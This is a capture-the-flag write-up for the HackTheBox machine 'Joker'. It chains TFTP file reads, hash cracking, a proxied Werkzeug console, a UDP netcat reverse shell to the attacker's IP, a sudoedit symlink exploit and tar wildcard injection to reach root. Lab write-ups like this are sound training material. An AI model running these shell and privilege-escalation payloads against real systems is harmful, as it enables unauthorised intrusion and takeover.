# HTB: Joker — Writeup

**Difficulty:** Hard | **OS:** Linux | **IP:** 10.10.10.21  
**Profile:** [MaikPro @ HackTheBox](https://app.hackthebox.com/profile/MaikPro)

---

## Summary

Joker involves chaining several non-obvious steps: discovering TFTP on UDP,
extracting Squid proxy credentials, tunneling through the proxy to reach an
internal Werkzeug console, bypassing TCP egress firewall rules with a UDP
reverse shell, exploiting a sudoedit symlink vulnerability to pivot users,
and finally getting root via tar wildcard injection in a cron job.

---

## Enumeration

### TCP Scan

```bash
nmap -sC -sV -oA nmap/joker 10.10.10.21
```

```
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.3p1 Ubuntu
3128/tcp open  http-proxy Squid http proxy 3.5.12
```

Only two TCP ports. Squid on 3128 requires authentication.

### UDP Scan

```bash
nmap -sU -oA nmap/joker-udp 10.10.10.21
```

```
PORT    STATE         SERVICE
69/udp  open|filtered tftp
```

TFTP on UDP/69 — no authentication required. This is the critical pivot.

---

## Foothold

### TFTP — Extracting Squid Config

```bash
tftp 10.10.10.21
tftp> get /etc/squid/squid.conf
tftp> get /etc/squid/passwords
tftp> quit
```

`passwords` returns an Apache MD5 hash:

```
kalamari:$apr1$zyzBxQYW$pL360IoLQ5Yum5SLTph.l0
```

Crack with hashcat:

```bash
hashcat -m 1600 squid.hash /usr/share/wordlists/rockyou.txt
```

Credentials: `kalamari:ihateseafood`

### Squid Proxy — Internal Service Discovery

Using the proxy to enumerate internal services:

```bash
gobuster dir \
  -u http://127.0.0.1 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  --proxy http://kalamari:ihateseafood@10.10.10.21:3128
```

Found: `/console` — Werkzeug Python debugger exposed internally.

### Werkzeug Console — Firewall Check

Firewall rules via the Python console:

```python
import os
os.popen("base64 -w 0 /etc/iptables/rules.v4").read()
```

Key rule: **TCP egress blocked for new connections**. UDP unrestricted.  
Standard reverse shells won't work — need UDP.

### Reverse Shell via UDP

Listener on attacker machine using socat (required for interactive UDP):

```bash
socat file:`tty`,echo=0,raw udp-listen:9001
```

Payload via Werkzeug console:

```python
os.popen("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -u 10.10.14.X 9001 >/tmp/f &").read()
```

Shell as `werkzeug`.

---

## Privilege Escalation — werkzeug → alekos

```bash
sudo -l
# (alekos) NOPASSWD: sudoedit /var/www/*/*/layout.html
```

Sudo 1.8.16 with `sudoedit_follow` — vulnerable to symlink following (CVE-2015-5602).

```bash
mkdir -p /var/www/testing/tester
cd /var/www/testing/tester
ln -s /home/alekos/.ssh/authorized_keys layout.html

sudoedit -u alekos /var/www/testing/tester/layout.html
# Editor opens authorized_keys — insert public key
```

Generate key locally:

```bash
ssh-keygen -f alekos_key
```

Paste public key content via sudoedit. Then:

```bash
ssh -i alekos_key alekos@10.10.10.21
```

**User flag captured.**

---

## Privilege Escalation — alekos → root

Cron job running as root every ~5 minutes:

```bash
cd /home/alekos/development && tar cf /home/alekos/backup/$(date +%F-%H%M).tar.gz *
```

Unquoted wildcard passed to `tar` — classic wildcard injection.

```bash
cd /home/alekos/development

echo "cp /bin/bash /tmp/bash && chmod +s /tmp/bash" > shell.sh
chmod +x shell.sh

touch -- --checkpoint=1
touch -- '--checkpoint-action=exec=sh shell.sh'
```

When cron runs, shell expands `*` and tar receives the filenames as flags,
executing `shell.sh` as root.

```bash
# Wait ~5 minutes, then:
/tmp/bash -p
```

**Root flag captured.**

---

## Attack Chain

```
nmap UDP → TFTP/69
  → get squid passwords → hashcat → kalamari:ihateseafood
  → Squid proxy → Werkzeug /console
  → iptables: TCP egress blocked → UDP reverse shell (socat)
  → werkzeug shell
  → sudoedit symlink (CVE-2015-5602) → alekos SSH
  → tar wildcard injection (cron) → root
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | TCP + UDP enumeration |
| tftp | Extracting Squid credentials |
| hashcat | Cracking APR MD5 hash |
| gobuster | Directory fuzzing via proxy |
| socat | UDP reverse shell listener |
| sudoedit | Symlink exploitation |
| ssh-keygen | Key generation for alekos |

---

## CVEs & Techniques

| Reference | Description |
|-----------|-------------|
| CVE-2015-5602 | sudoedit symlink following via wildcard path |
| — | TFTP unauthenticated file read |
| — | Squid proxy misconfiguration (internal service exposure) |
| — | tar wildcard injection via cron job |
| — | TCP egress bypass using UDP reverse shell |
